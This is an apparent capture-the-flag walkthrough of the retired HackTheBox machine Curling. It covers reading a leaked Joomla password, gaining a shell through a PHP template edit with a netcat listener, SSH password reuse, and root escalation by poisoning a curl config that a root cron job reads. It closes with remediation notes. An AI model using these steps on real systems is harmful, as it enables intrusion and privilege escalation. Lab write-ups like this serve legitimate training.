HTB Curling: Joomla secret to shell, writable curl config to root

retired-machineeasy

Curling is a retired HackTheBox easy Linux machine rewarding reading files other people ignore. Synopsis: a secret.txt hands over the Joomla admin password, a template edit becomes a shell, and a root cron trusting a writable curl config ends it.

$ Enumeration — files before exploits

# bash: fuzz and read secret.txt
nmap -sC -sV -oN curling.nmap 10.10.10.150
gobuster dir -u http://10.10.10.150 -w common.txt   # -> secret.txt
curl -s http://10.10.10.150/secret.txt

A stray file in the web root contains the administrator password. Stray files are credentials until proven otherwise: try the secret against the Joomla admin login and you are in as Super User.

$ Foothold — template to shell

# bash: template edit plus listener
# Joomla admin -> Templates -> edit active template -> insert PHP system() payload
# browse the template page to trigger
nc -lvnp 4444   # www-data

A Joomla Super User can edit templates, and template fields execute PHP. Insert the payload, browse the page, catch the callback.

$ Lateral move — password reuse

# bash: same secret, SSH floris
ssh floris@10.10.10.150   # same password as the Joomla secret

One password, two identities — password reuse strikes again, and now you have an interactive shell with a home directory to enumerate.

$ Privilege escalation — writable curl config in root cron

# bash: poison the cron config
cat /etc/crontab   # root runs: curl -K <floris-writable-config>
ls -l ~/admin-area/input   # writable!
# append an --output directive redirecting to a sensitive path / payload drop:
echo "--output /etc/cron.d/pwn" >> ~/admin-area/input   # wait for the tick
id   # uid=0(root)

A root cronjob fetches a URL using a curl config file (-K) that lives in floris-writable space. curl configs accept --output directives — redirect one to a sensitive file and the schedule does the rest. Schedules trusting user-writable input are root by appointment. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Attacking Joomla extensions for CVEs first (the secret file is the intended door) and cracking hashes before trying reuse.

$ Remediation notes

Keep secrets out of web roots, forbid template editing in production, enforce unique credentials, and never let privileged automation consume user-writable config. Written by Lucky Thandel.
